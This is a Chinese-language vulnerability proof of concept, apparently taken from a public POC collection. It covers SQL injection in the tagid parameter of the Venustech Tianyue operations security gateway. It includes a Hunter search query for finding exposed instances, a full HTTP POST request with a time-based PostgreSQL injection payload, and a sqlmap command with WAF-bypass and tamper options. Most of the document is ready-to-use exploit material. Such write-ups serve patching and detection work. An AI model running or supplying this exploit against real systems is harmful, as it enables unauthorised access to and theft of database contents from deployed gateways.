# 启明星辰天玥运维安全网关tagid参数存在SQL注入漏洞

# 一、漏洞简介
天玥网络安全审计系统是针对业务环境下用户对网络内的核心IT资产和服务器进行的操作行为进行细粒度审计的合规性管理系统。 启明星辰天玥网络安全审计系统tagid参数存在SQL注入漏洞，攻击者可利用该漏洞获取数据库敏感信息。

# 二、影响版本
+ 天玥运维安全网关

# 三、资产测绘
+ hunter`app.name="启明星辰天玥运维安全网关"`
+ 特征


# 四、漏洞复现
```plain
POST /ops/index.php?c=Reportguide&a=checkrn HTTP/1.1
Host: xx.xx.xx.xx
Connection: close
Cache-Control: max-age=0
sec-ch-ua: "Chromium";v="88", "Google Chrome";v="88", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/x-www-form-urlencoded
Content-Length: 39


checkname=123&tagid=123 AND 5327=(SELECT 5327 FROM PG_SLEEP(5))-- OkPa
```


sqlmap 

```plain
sqlmap -u "https://xx.xx.xx.xx/ops/index.php?c=Reportguide&a=checkrn" --data "checkname=123&tagid=123" --skip-waf --random-agent --batch -p tagid  --tamper=space2comment
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/lli5osp0pzdm1zdo>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
